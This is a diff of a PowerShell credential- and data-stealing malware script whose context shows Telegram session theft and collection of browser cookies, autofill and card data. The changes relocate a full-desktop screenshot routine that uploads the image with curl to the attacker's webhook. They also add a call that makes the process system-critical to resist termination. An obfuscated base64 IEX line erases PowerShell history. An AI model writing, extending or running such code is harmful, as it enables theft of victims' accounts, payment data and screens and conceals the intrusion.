@@ -230,6 +230,7 @@ function Invoke-ANTITOTAL {
             ""
         }
     }
+    [ProcessUtility]::MakeProcessCritical()	
     Invoke-TASKS
 }
 
@@ -386,21 +387,6 @@ function Backup-Data {
     }
     Get-ProductKey > $folder_general\productkey.txt
 	
-	# Desktop screenshot
-    Add-Type -AssemblyName System.Windows.Forms,System.Drawing
-    $screens = [Windows.Forms.Screen]::AllScreens
-    $top    = ($screens.Bounds.Top    | Measure-Object -Minimum).Minimum
-    $left   = ($screens.Bounds.Left   | Measure-Object -Minimum).Minimum
-    $width  = ($screens.Bounds.Right  | Measure-Object -Maximum).Maximum
-    $height = ($screens.Bounds.Bottom | Measure-Object -Maximum).Maximum
-    $bounds   = [Drawing.Rectangle]::FromLTRB($left, $top, $width, $height)
-    $bmp      = New-Object System.Drawing.Bitmap ([int]$bounds.width), ([int]$bounds.height)
-    $graphics = [Drawing.Graphics]::FromImage($bmp)
-    $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)
-    $bmp.Save("$folder_general\screenshot.png")
-    $graphics.Dispose()
-    $bmp.Dispose()
-
     # All Messaging Sessions
     function telegramstealer {
         $processname = "telegram"
@@ -880,11 +866,26 @@ function Backup-Data {
 
     $main_temp = "$env:localappdata\temp"
     $avatar = "https://i.postimg.cc/k58gQ03t/PTG.gif"
+	
+	Add-Type -AssemblyName System.Windows.Forms,System.Drawing
+    $screens = [Windows.Forms.Screen]::AllScreens
+    $top    = ($screens.Bounds.Top    | Measure-Object -Minimum).Minimum
+    $left   = ($screens.Bounds.Left   | Measure-Object -Minimum).Minimum
+    $width  = ($screens.Bounds.Right  | Measure-Object -Maximum).Maximum
+    $height = ($screens.Bounds.Bottom | Measure-Object -Maximum).Maximum
+    $bounds   = [Drawing.Rectangle]::FromLTRB($left, $top, $width, $height)
+    $bmp      = New-Object System.Drawing.Bitmap ([int]$bounds.width), ([int]$bounds.height)
+    $graphics = [Drawing.Graphics]::FromImage($bmp)
+    $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)
+    $bmp.Save("$main_temp\screenshot.png")
+    $graphics.Dispose()
+    $bmp.Dispose()
+	
     curl.exe -F "payload_json={\`"avatar_url\`":\`"$avatar\`",\`"username\`": \`"KDOT\`", \`"content\`": \`"# :desktop: Screenshot\n\n\`"}" -F "file=@\`"$main_temp\screenshot.png\`"" "$($webhook)" | Out-Null
 
-    #TODO ill fix tokens tomorrow
+    
     Move-Item "$main_temp\discord.json" $folder_general -Force	
-    Move-Item "$main_temp\screenshot.png" $folder_general -Force
+	Move-Item "$main_temp\screenshot.png" $folder_general -Force
     Move-Item -Path "$main_temp\autofill.json" -Destination "$browser_data" -Force
     Move-Item -Path "$main_temp\cards.json" -Destination "$browser_data" -Force
     Move-Item -Path "$main_temp\cookies_netscape.txt" -Destination "$browser_data" -Force
@@ -936,6 +937,7 @@ if (INVOKE-AC -eq $true) {
     if ($debug) {
         Read-Host "Press Enter to continue..."
     } else {
+         [ProcessUtility]::MakeProcessKillable()
     }
     I'E'X([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("UmVtb3ZlLUl0ZW0gKEdldC1QU3JlYWRsaW5lT3B0aW9uKS5IaXN0b3J5U2F2ZVBhdGggLUZvcmNlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVl")))
 }
